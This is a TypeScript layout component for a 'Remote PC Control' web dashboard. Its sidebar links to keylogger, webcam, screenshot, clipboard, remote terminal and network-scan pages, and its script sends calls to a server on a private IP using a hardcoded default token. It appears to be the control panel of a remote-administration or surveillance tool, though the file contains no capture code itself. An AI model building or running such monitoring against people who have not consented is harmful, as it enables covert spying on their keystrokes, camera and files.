import type { Child } from 'hono/jsx'
import { html } from 'hono/html'

type LayoutProps = {
  title: string
  active: string
  children: Child
}

const navItems = [
  { href: '/', label: 'Dashboard', icon: '&#9783;' },
  { href: '/apps', label: 'Applications', icon: '&#9881;' },
  { href: '/processes', label: 'Processes', icon: '&#9776;' },
  { href: '/screenshot', label: 'Screenshot', icon: '&#128247;' },
  { href: '/keylogger', label: 'Keylogger', icon: '&#9000;' },
  { href: '/files', label: 'File Manager', icon: '&#128193;' },
  { href: '/system', label: 'System Control', icon: '&#9211;' },
  { href: '/webcam', label: 'Webcam', icon: '&#127909;' },
  { href: '/terminal', label: 'Remote Terminal', icon: '&#62;_' },
  { href: '/monitor', label: 'Live Monitor', icon: '&#128200;' },
  { href: '/clipboard', label: 'Clipboard', icon: '&#128203;' },
  { href: '/network', label: 'Network Scan', icon: '&#127760;' },
  { href: '/audit', label: 'Audit Log', icon: '&#128218;' },
]

export function Layout({ title, active, children }: LayoutProps) {
  return (
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>{title} - Remote PC Control</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdn.jsdelivr.net/npm/chart.js@4/dist/chart.umd.min.js"></script>
        {html`
          <style>
            .spinner {
              border: 3px solid rgba(255, 255, 255, 0.1);
              border-left-color: #3b82f6;
              border-radius: 50%;
              width: 20px;
              height: 20px;
              animation: spin 0.6s linear infinite;
              display: inline-block;
            }
            @keyframes spin {
              to {
                transform: rotate(360deg);
              }
            }
          </style>
        `}
      </head>
      <body class="bg-gray-950 text-gray-100 min-h-screen flex">
        {/* Sidebar */}
        <aside class="w-64 bg-gray-900 min-h-screen p-5 flex flex-col border-r border-gray-800 shrink-0">
          <div class="mb-8">
            <h1 class="text-lg font-bold text-blue-400 tracking-tight">Remote PC Control</h1>
            <p class="text-xs text-gray-500 mt-1">Client Dashboard</p>
          </div>
          <nav class="space-y-1 flex-1">
            {navItems.map((item) => (
              <a
                href={item.href}
                class={
                  'flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm transition-colors ' +
                  (active === item.href
                    ? 'bg-blue-600/20 text-blue-400 font-medium'
                    : 'text-gray-400 hover:bg-gray-800 hover:text-gray-200')
                }
              >
                {item.label}
              </a>
            ))}
          </nav>
          <div class="mt-4 pt-4 border-t border-gray-800">
            <div class="text-xs text-gray-600">
              <div id="conn-status" class="flex items-center gap-2">
                <span class="w-2 h-2 rounded-full bg-gray-600"></span>
                Not connected
              </div>
            </div>
          </div>
        </aside>

        {/* Main content */}
        <main class="flex-1 p-8 overflow-auto min-h-screen">
          <h2 class="text-2xl font-bold mb-6 text-gray-100">{title}</h2>
          <div id="notification" class="hidden fixed top-4 right-4 p-4 rounded-lg shadow-lg z-50 max-w-md text-sm"></div>
          {children}
        </main>

        {/* Global JavaScript */}
        {html`<script>
          var API_URL = localStorage.getItem('serverUrl') || 'http://192.168.10.202:3001';
          var AUTH_TOKEN = localStorage.getItem('authToken') || 'changeme-secret-token';

          function escapeHtml(str) {
            if (!str && str !== 0) return '';
            return String(str)
              .replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;');
          }

          function formatBytes(bytes) {
            if (!bytes) return '0 B';
            var k = 1024;
            var sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            var i = Math.floor(Math.log(bytes) / Math.log(k));
            return (bytes / Math.pow(k, i)).toFixed(1) + ' ' + sizes[i];
          }

          async function apiCall(endpoint, options) {
            options = options || {};
            try {
              var headers = {
                'Content-Type': 'application/json',
                Authorization: 'Bearer ' + AUTH_TOKEN,
              };
              if (options.headers) {
                Object.assign(headers, options.headers);
              }
              if (options.rawBody) {
                delete headers['Content-Type'];
              }
              var resp = await fetch(
                API_URL + endpoint,
                Object.assign({}, options, { headers: headers })
              );
              if (!resp.ok) {
                var errBody = await resp.json().catch(function () {
                  return { error: 'HTTP ' + resp.status };
                });
                throw new Error(errBody.error || 'HTTP ' + resp.status);
              }
              return await resp.json();
            } catch (e) {
              showNotification('Error: ' + e.message, 'error');
              throw e;
            }
          }

          async function apiCallRaw(endpoint, options) {
            options = options || {};
            var resp = await fetch(
              API_URL + endpoint,
              Object.assign({}, options, {
                headers: Object.assign({ Authorization: 'Bearer ' + AUTH_TOKEN }, options.headers || {}),
              })
            );
            if (!resp.ok) throw new Error('HTTP ' + resp.status);
            return resp;
          }

          function showNotification(msg, type) {
            var el = document.getElementById('notification');
            el.textContent = msg;
            el.className =
              'fixed top-4 right-4 p-4 rounded-lg shadow-lg z-50 max-w-md text-sm ' +
              (type === 'error'
                ? 'bg-red-600 text-white'
                : type === 'success'
                  ? 'bg-green-600 text-white'
                  : 'bg-blue-600 text-white');
            clearTimeout(window.__notifTimeout);
            window.__notifTimeout = setTimeout(function () {
              el.className = 'hidden';
            }, 4000);
          }

          // Check connection on load
          (async function checkConnection() {
            var el = document.getElementById('conn-status');
            try {
              var resp = await fetch(API_URL + '/', {
                headers: { Authorization: 'Bearer ' + AUTH_TOKEN },
              });
              if (resp.ok) {
                el.innerHTML =
                  '<span class="w-2 h-2 rounded-full bg-green-500"></span> Connected';
              } else {
                el.innerHTML =
                  '<span class="w-2 h-2 rounded-full bg-red-500"></span> Auth failed';
              }
            } catch (e) {
              el.innerHTML =
                '<span class="w-2 h-2 rounded-full bg-red-500"></span> Disconnected';
            }
          })();
        </script>`}
      </body>
    </html>
  )
}
